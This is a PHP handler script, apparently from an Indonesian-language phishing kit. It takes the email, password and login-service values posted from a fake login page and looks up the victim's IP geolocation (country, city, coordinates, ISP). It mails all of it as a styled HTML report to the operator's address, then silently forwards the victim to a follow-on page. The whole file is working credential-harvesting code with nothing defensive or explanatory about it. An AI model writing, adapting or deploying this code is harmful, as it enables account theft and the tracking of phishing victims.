<?php
include 'system/setting.php';
include 'system/geolocation.php';
include 'system/get_flag.php';
include 'system/get_callingcode.php';
include 'email.php';

// MENANGKAP DATA YANG DI-INPUT
$user = new get_flag();
$email = $user->post($_POST['email']);
$password = $user->post($_POST['password']);
$login = $user->post($_POST['login']);

$benua = $bg['continent'];
$negara = $bg['country'];
$region = $bg['regionName'];
$city = $bg['city'];
$latitude = $bg['lat'];
$longtitude = $bg['lon'];
$timezone = $bg['timezone'];
$perdana = $bg['isp'];
$ipaddress = $bg['query'];

if($email == "" && $password == "" && $login == ""){
header("Location: index.php");
}else{

$subjek = "$resultFlags | PUNYA SI $email | LOGIN $login";
$pesan = '
<center>
 <div style="background: url(https://coverfiles.alphacoders.com/431/43135.png) no-repeat center center fixed;border:2px solid black;background-size: 100% 100%; width: 294; height: 100px; color: #000; text-align: center; border-top-left-radius: 5px; border-top-right-radius: 5px;">
</div>
 <table border="1" style="border-radius:8px; border:4px solid black; border-collapse:collapse;width:100%;background:linear-gradient(90deg,gold,orange);">
    <tr>
<th style="width: 22%; text-align: left;" height="25px"><b>EMAIL/PHONE/USERNAME</th>
<th style="width: 78%; text-align: center;"><b>'.$email.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>PASSWORD</th>
<th style="width: 78%; text-align: center;"><b>'.$password.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>LOGIN</th>
<th style="width: 78%; text-align: center;"><b>'.$login.'</th> 
</tr>
</table>
<table border="1" style="border-radius:8px;border:5px solid black;border-collapse:collapse;width:100%;background:linear-gradient(90deg,gold,orange);">
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>COUNTRY</th>
<th style="width: 78%; text-align: center;"><b>'.$negara.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>CALLING CODE</th>
<th style="width: 78%; text-align: center;"><b>'.$arpantekCalling.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>REGION</th>
<th style="width: 78%; text-align: center;"><b>'.$region.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>CITY</th>
<th style="width: 78%; text-align: center;"><b>'.$city.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>LATITUDE</th>
<th style="width: 78%; text-align: center;"><b>'.$latitude.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>LONGITUDE</th>
<th style="width: 78%; text-align: center;"><b>'.$longtitude.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>ALAMAT IP</th>
<th style="width: 78%; text-align: center;"><b>'.$ipaddress.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>PERDANA</th>
<th style="width: 78%; text-align: center;"><b>'.$perdana.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>TIME ZONE</th>
<th style="width: 78%; text-align: center;"><b>'.$timezone.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>WAKTU MASUK</th>
<th style="width: 78%; text-align: center;"><b>'.$jamasuk.'</th> 
</tr>
</table>
<div style="border:2px solid black;width: 294; font-weight:bold; height: 20px; background: linear-gradient(90deg,gold,orange); color: black; padding: 10px; border-bottom-left-radius: 5px; border-bottom-right-radius: 5px; text-align: center;">
<div style="font-weight:bold;font-size:15px;">&copy; https://t.me/jefanya14</div>
</div>
 <center>
';
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= ''.$sender.'' . "\r\n";
$user->mail($emailku, $subjek, $pesan, $headers);

// MENDAPATKAN DATA YANG DI-INPUT DAN MENGALIHKAN KE HALAMAN COMPLETED
echo "<form id='jefanya' method='POST' action='processing.php'>
<input type='hidden' name='email' value='$email'>
</form>
<script type='text/javascript'>document.getElementById('jefanya').submit();</script>";
}
?>